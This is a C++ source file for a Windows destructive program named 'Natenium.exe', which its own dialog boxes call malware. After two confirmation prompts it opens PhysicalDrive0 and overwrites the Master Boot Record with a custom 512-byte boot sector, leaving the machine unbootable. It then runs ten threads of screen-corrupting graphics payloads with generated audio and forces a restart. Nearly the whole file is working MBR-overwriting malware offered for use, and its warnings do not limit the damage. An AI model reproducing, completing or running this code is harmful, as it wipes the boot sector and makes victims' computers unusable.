#define _USE_MATH_DEFINES 1
#include <windows.h>
#include <windowsx.h>
#include <cmath>
#include <iostream>
static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
const unsigned char MasterBootRecord[] = {
	0x31, 0xC0, 0x8E, 0xD8, 0xB4, 0xA0, 0x8E, 0xC0, 0xB8, 0x13, 0x00, 0xCD,
	0x10, 0xB0, 0xB6, 0xE6, 0x43, 0xBE, 0xDB, 0x7C, 0xBF, 0xED, 0x7C, 0xBA,
	0x09, 0x00, 0x8A, 0x0D, 0x47, 0xAD, 0xE6, 0x42, 0x88, 0xE0, 0xE6, 0x42,
	0xE4, 0x61, 0x0C, 0x03, 0xE6, 0x61, 0xB8, 0x00, 0x86, 0xCD, 0x15, 0xE4,
	0x61, 0x24, 0xFC, 0xE6, 0x61, 0x4A, 0x75, 0xE2, 0xBD, 0xF6, 0x7C, 0x0F,
	0x31, 0x83, 0xE0, 0x01, 0x74, 0x03, 0x83, 0xC5, 0x04, 0xBA, 0x5C, 0x00,
	0xB9, 0x98, 0x00, 0xBB, 0x04, 0x00, 0x01, 0xC3, 0xA8, 0x01, 0x75, 0x02,
	0x42, 0x42, 0x4A, 0xBE, 0xFE, 0x7C, 0xE8, 0x1E, 0x00, 0xE8, 0x1B, 0x00,
	0xE8, 0x18, 0x00, 0x4B, 0x75, 0xEA, 0xBB, 0x10, 0x00, 0xBE, 0xBE, 0x7D,
	0xE8, 0x0C, 0x00, 0x4B, 0x75, 0xF7, 0x52, 0x0F, 0x31, 0x83, 0xE0, 0x0F,
	0x5A, 0xEB, 0xD0, 0x41, 0x60, 0xB8, 0x40, 0x01, 0xF7, 0xE2, 0x01, 0xC8,
	0x89, 0xC7, 0xB9, 0x10, 0x00, 0x30, 0xD2, 0x81, 0xEF, 0x40, 0x01, 0x26,
	0x88, 0x15, 0x47, 0xE2, 0xFA, 0x81, 0xC7, 0x30, 0x01, 0x4F, 0x26, 0x88,
	0x15, 0x47, 0xAC, 0xC0, 0xC0, 0x02, 0x88, 0xC3, 0x83, 0xE3, 0x03, 0x01,
	0xEB, 0x8A, 0x17, 0x26, 0x88, 0x15, 0x47, 0x41, 0xF6, 0xC1, 0x03, 0x75,
	0xEA, 0xF6, 0xC1, 0x0F, 0x75, 0xE4, 0x30, 0xD2, 0x26, 0x88, 0x15, 0x81,
	0xC7, 0x30, 0x01, 0xF7, 0xC1, 0xFF, 0x00, 0x75, 0xD0, 0xC1, 0xE9, 0x04,
	0x30, 0xC0, 0xF3, 0xAA, 0x41, 0xB8, 0x00, 0x86, 0xCD, 0x15, 0x61, 0x83,
	0xC6, 0x40, 0xC3, 0x23, 0x0E, 0x23, 0x0E, 0x01, 0x00, 0x23, 0x0E, 0xD0,
	0x11, 0x23, 0x0E, 0xE3, 0x0B, 0x01, 0x00, 0xC7, 0x17, 0x02, 0x02, 0x01,
	0x04, 0x02, 0x04, 0x04, 0x04, 0x04, 0x00, 0x28, 0x2B, 0x44, 0x00, 0x0F,
	0x02, 0x2B, 0x00, 0x15, 0x50, 0x00, 0x00, 0x55, 0x55, 0x40, 0x00, 0xAB,
	0xEC, 0x00, 0x02, 0xEF, 0xEF, 0xC0, 0x02, 0xEB, 0xFB, 0xF0, 0x02, 0xBF,
	0xEA, 0x80, 0x00, 0x3F, 0xFF, 0x00, 0x0A, 0xA5, 0xA0, 0x00, 0xFA, 0xA5,
	0x6A, 0xFC, 0xFC, 0xA7, 0x56, 0xBC, 0xF0, 0x55, 0x54, 0x20, 0x01, 0x55,
	0x55, 0xA0, 0x05, 0x55, 0x55, 0xA0, 0x29, 0x50, 0x15, 0xA0, 0x2A, 0x00,
	0x00, 0x00, 0x0A, 0x80, 0x00, 0x00, 0x00, 0x15, 0x50, 0x00, 0x00, 0x55,
	0x55, 0x40, 0x00, 0xAB, 0xEC, 0x00, 0x02, 0xEF, 0xEF, 0xC0, 0x02, 0xEB,
	0xFB, 0xF0, 0x02, 0xBF, 0xEA, 0x80, 0x00, 0x3F, 0xFF, 0x00, 0x00, 0xA6,
	0xA0, 0x00, 0x02, 0xA9, 0x68, 0x00, 0x02, 0xA5, 0xD7, 0x00, 0x02, 0xA9,
	0x55, 0x00, 0x01, 0xAF, 0xD5, 0x00, 0x00, 0x6F, 0x54, 0x00, 0x00, 0x15,
	0xA8, 0x00, 0x00, 0x2A, 0xAA, 0x00, 0x00, 0x2A, 0x80, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x15, 0x50, 0x00, 0x00, 0x55, 0x55, 0x40, 0x00, 0xAB,
	0xEC, 0x00, 0x02, 0xEF, 0xEF, 0xC0, 0x02, 0xEB, 0xFB, 0xF0, 0x02, 0xBF,
	0xEA, 0x80, 0x00, 0x3F, 0xFF, 0x00, 0x00, 0xAA, 0x63, 0x00, 0x03, 0xAA,
	0xAF, 0xC0, 0x0F, 0x6A, 0xAF, 0x00, 0x0A, 0x55, 0x54, 0x00, 0x09, 0x55,
	0x54, 0x00, 0x29, 0x51, 0x50, 0x00, 0x20, 0x0A, 0x80, 0x00, 0x00, 0x0A,
	0xA0, 0x00, 0x00, 0x15, 0x50, 0x00, 0x00, 0x55, 0x55, 0x40, 0x00, 0xAB,
	0xEC, 0x00, 0x02, 0xEF, 0xEF, 0xC0, 0x02, 0xEB, 0xFB, 0xF0, 0x02, 0xBF,
	0xEA, 0x80, 0x00, 0x3F, 0xFF, 0x00, 0x00, 0xA6, 0xA0, 0x00, 0x02, 0xA6,
	0x9A, 0x80, 0x0A, 0xA5, 0x5A, 0xA0, 0x0F, 0x9D, 0x76, 0xF0, 0x0F, 0xD5,
	0x57, 0xF0, 0x0F, 0x55, 0x55, 0xF0, 0x00, 0x54, 0x15, 0x00, 0x02, 0xA0,
	0x0A, 0x80, 0x0A, 0xA0, 0x0A, 0xA0, 0x55, 0xAA
};


VOID WINAPI destruction()
{
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);
    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}
DWORD WINAPI payload1(LPVOID lpParam)
{
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        if (!i)RedrawWindow(0, 0, 0, 133);
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, 0x330008);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = randy()%0xff;
        for (int i = 0; w * h > i; i++) {
            if (i % h == 0 && randy() % 100 == 0)
                v = randy() % 50;
            ((BYTE*)(data + i))[v % 3] += ((BYTE*)(data + i + v))[v] ^ byte;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, randy() % 3 - 1, randy() % 3 - 1, w, h, hdcdc, 0, 0, 0xCC0020);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
} 

DWORD WINAPI payload2(LPVOID lpParam) 
{
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, 4 * h * w, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 10)
            byte = randy()%0xff;
        for (int i = 0; w * h > i; ++i) {
            if (!(i % h) && !(randy() % 110))
                v = randy() % 24;
            *((BYTE*)data + 4 * i + v) -= 5;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
} 
DWORD WINAPI payload3(LPVOID lpParam) 
{
	int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);
    while(1){
    	HDC hdc = GetDC(0);
		POINT p[4]  = {rand() % sw, rand() % sh, rand() % sw, rand() % sh,  rand() % sw, rand() % sh};
        HPEN hPen = CreatePen(PS_SOLID,5,RGB(0,0,255));
        SelectObject(hdc, hPen);
		PolyBezier(hdc, p, 4);
    	DeleteObject(hPen);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI payload3point1(LPVOID lpParam) 
{
	HDC desk;
	int sw, sh;
	
	while(1){
		desk = GetDC(0);
		sw = GetSystemMetrics(0);
		sh = GetSystemMetrics(1);
		StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, SRCCOPY);
		ReleaseDC(0, desk);
		Sleep(4);
	}
}
DWORD WINAPI payload4(LPVOID lpParam)
{
    while (1) {
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI payload5(LPVOID lpParam)
{
	while(1){
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		HPEN hPen = CreatePen(PS_SOLID, 2, RGB(255, 0, 0));
		HPEN hOldPen = SelectPen(hdc, hPen);
		HBRUSH hBrush = CreateSolidBrush(RGB(0, 0, 255));
		HBRUSH hOldBrush = SelectBrush(hdc, hBrush);
		POINT vertices[] = { {rand() % w, rand() % h}, {rand() % w, rand() % h}, {rand() % w, rand() % h} };
		Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));
		SelectBrush(hdc, hOldBrush);
		DeleteObject(hBrush);
		SelectPen(hdc, hOldPen);
		DeleteObject(hPen);
		ReleaseDC(0,hdc);
	}
}
DWORD WINAPI payload6(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
	while(1){
		HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;
		int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = 100 + x;
        int bottom_y = 100 + y; 
    	HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    	SelectObject(hdc, brush);
		Rectangle(hdc, top_x, top_y, bottom_x, bottom_y);
        if (y >= GetSystemMetrics(SM_CYSCREEN))
        {
                signY = -1;
        }
        if (x >= GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -1;
        }
        if (y == 0)
        {
            signY = 1;
        }
        if (x == 0)
        {
            signX = 1;
        }
        Sleep(10);
    	DeleteObject(brush);
        ReleaseDC(0, hdc);
	}
}
DWORD WINAPI payload6point1(LPVOID lpParam)
{
    HDC hdc;
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        hdc = GetDC(0);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCPAINT);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI payload7(LPVOID lpParam)
{
	HDC hdc = GetDC(HWND_DESKTOP);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
	
	while (true)
	{
		HDC hdc = GetDC(HWND_DESKTOP);
		int y = rand()%sh, h = sh - rand()%sh - (sh / 1 - 8);
		HBRUSH brush = CreateSolidBrush(RGB(rand()%75, rand()%75, rand()%75));
	    SelectObject(hdc, brush);
	    BitBlt(hdc, 0, y, sw, h, hdc, rand() % 96 - 56, y, SRCCOPY);
	    PatBlt(hdc, -1, y, sw, h, PATINVERT);
	    Sleep(10);
	}
}
DWORD WINAPI payload8(LPVOID lpParam)
{
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 20;
			BitBlt(hdc, 0, i, sw, 1, hdc, a, i, SRCCOPY);
			BitBlt(hdc, i, 0, 1, sh, hdc, i, a, SRCCOPY);
			angle += M_PI / 40;
			DeleteObject(&i); DeleteObject(&a);
		}
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}
DWORD WINAPI payload9(LPVOID lpParam)
{
	int ticks = GetTickCount(), w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC hdc = GetDC(0), hdcMem = CreateCompatibleDC(hdc);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;BYTE bt = 0;
		if ((GetTickCount() - ticks) > 60000) bt = rand() & 0xffffff;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 100 == 0) v = rand() % 50;
			((BYTE*)(data + i))[v ? 252 : 252] += ((BYTE*)(data + i))[i % 3] ^ bt;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
	}
}
DWORD WINAPI payload10(LPVOID lpParam)
{
	while (1) {
		HDC hdc = GetDC(HWND_DESKTOP);
		int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
		BitBlt(hdc, rand() % 5, rand() % 5, rand() % sw, rand() % sh, hdc, rand() % 5, rand() % 5, SRCCOPY);
		ReleaseDC(0, hdc);
	}
}
VOID WINAPI audio1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>((~t/100|(t*3))^(t*3&(t>>5))&t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI audio2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t&t>>12)*(t>>4|t>>8);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI audio3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>((t&((t>>5)))+(t|((t>>7))))&(t>>6)|(t>>5)&(t*(t>>7));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI audio4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t*((t&4096?6:16)+(1&t>>14))>>(3&t>>4))|(t>>(t&8192?3:4));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI audio5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t>>6|t<<1)+((t>>5|t<<3)|t>>3)|(t>>2)|(t<<1);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI audio6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t>>9&2*t&10*t)|(t>>5&6*t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI audio7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t*(((t>>11)&(t>>8))&(123&(t>>3))));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI audio8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t*(0xCA98>>(t>>9&14)&15)|t>>4);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI audio9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t>>13|t%24)&(t>>7|t%19);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI audiolast() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t*5&t>>7)|(t*3&t>>10);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{

    if (MessageBoxW(NULL, L"The software you just executed malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test such as a virtual machine, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"Natenium.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"Natenium.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            destruction();
            HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
            audio1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
            audio2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            HANDLE thread3point1 = CreateThread(0, 0, payload3point1, 0, 0, 0);
            HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
            audio3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            TerminateThread(thread3point1, 0);
            CloseHandle(thread3point1);
            HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
            audio4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
            audio5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
            HANDLE thread6point1 = CreateThread(0, 0, payload6point1, 0, 0, 0);
            audio6();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            TerminateThread(thread6point1, 0);
            CloseHandle(thread6point1);
            HANDLE thread7 = CreateThread(0, 0, payload7, 0, 0, 0);
            audio7();
            Sleep(30000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            HANDLE thread8 = CreateThread(0, 0, payload8, 0, 0, 0);
            audio8();
            Sleep(30000);
            TerminateThread(thread8, 0);
            CloseHandle(thread8);
            HANDLE thread9 = CreateThread(0, 0, payload9, 0, 0, 0);
            audio9();
            Sleep(30000);
            TerminateThread(thread9, 0);
            CloseHandle(thread9);
            HANDLE thread10 = CreateThread(0, 0, payload10, 0, 0, 0);
            audiolast();
            Sleep(30000);
            system("shutdown.exe /r /t 00");
        }
    }
}

